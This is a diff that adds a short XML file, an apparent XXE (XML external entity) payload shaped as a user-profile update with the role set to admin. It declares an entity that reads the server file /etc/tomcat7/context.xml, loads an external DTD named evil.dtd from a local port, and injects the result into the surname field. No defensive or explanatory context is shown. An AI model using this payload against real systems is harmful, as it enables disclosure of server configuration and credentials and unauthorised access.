@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE updateProfile [
+   <!ENTITY % file SYSTEM "file:///etc/tomcat7/context.xml">
+   <!ENTITY % start "<![CDATA[">
+   <!ENTITY % end "]]>">
+   <!ENTITY % dtd SYSTEM "http://127.0.0.1:5678/evil.dtd">
+%dtd;
+]>
+<user>
+    <firstname>John</firstname>
+    <surname>&xxe;</surname>
+    <email>jdoe@redacted.com</email>
+    <role>admin</role>
+</user>
